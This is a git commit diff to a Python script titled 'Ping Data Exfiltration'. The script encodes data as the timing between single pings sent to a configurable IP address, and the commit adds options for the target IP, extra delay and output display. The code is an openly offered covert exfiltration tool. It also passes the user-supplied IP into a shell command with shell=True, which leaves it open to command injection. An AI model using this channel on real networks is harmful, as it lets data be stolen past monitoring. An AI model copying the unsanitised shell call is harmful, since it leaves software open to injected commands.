2f3c4548daa912039c11886b125b18e9462159fd
Martino <martinoj2009@gmail.com>
2018-01-06 20:38:38 -0500

    Fixed up the ping script to allow some additonal options and defaults.

--- ping.py
+++ ping.py
@@ -3,17 +3,41 @@ Ping Data Exfiltration
 This script will allow you to convert data into pings, like morse code
 Martino Jones 20180105
 
-space is 111
+
 """
 
-#from os import system, subprocess
+import argparse
 import subprocess
+from os import devnull
 from sys import argv
 from time import sleep
 
+# Arguments the user can pass in to slightly modify the runtime
+parser = argparse.ArgumentParser(description='ICMPExfil encode and send script.')
+parser.add_argument('--wait', type=int,
+                    help='Number of additional seconds to wait for leeway.')
+parser.add_argument('--ip', type=str,
+                    help='IP Address to send ping, defaults to loopback address.')
+parser.add_argument('--show', action='store_true',
+                    help='Shows the pings if you would like output.')
+args = parser.parse_args()
 
+# Seconds of additional time to wait in-between pings
+wait = 0
+# This is the IP address you wish to ping
 ipToPing = "127.0.0.1"
+# Array of binary to be used for timing
 dataArray = []
+# Should the script output the ping stdout
+show = False
+
+# Get additional wait time if user provided is
+if args.wait:
+    wait = int(args.wait)
+if args.ip:
+    ipToPing = args.ip
+if args.show:
+    show = True
 
 
 def main():
@@ -35,12 +59,23 @@ def iter_bin(s):
 
 
 def ping(data):
+    print("Sending pings please wait...")
+
+    # Decide to show or not based on user input
+    if not show:
+        FNULL = open(devnull, 'w')
+    else:
+        FNULL = None
+
+    # Being sending
     for line in data:
         for char in line:
-            subprocess.call(["ping -c 1 " + ipToPing], shell=True)
-            #system("ping -c 1 " + ipToPing)
-            sleep(int(char))
-    subprocess.call(["ping -c 1 " + ipToPing], shell=True)
+            # Run systems ping, not writing my own and send to devnull
+            subprocess.call(["ping -c 1 " + ipToPing], shell=True, stdout=FNULL)
+
+            # Sleep for the desired amount of time
+            sleep(int(char) + wait)
+    subprocess.call(["ping -c 1 " + ipToPing], shell=True, stdout=FNULL)
     print(dataArray)
 
 
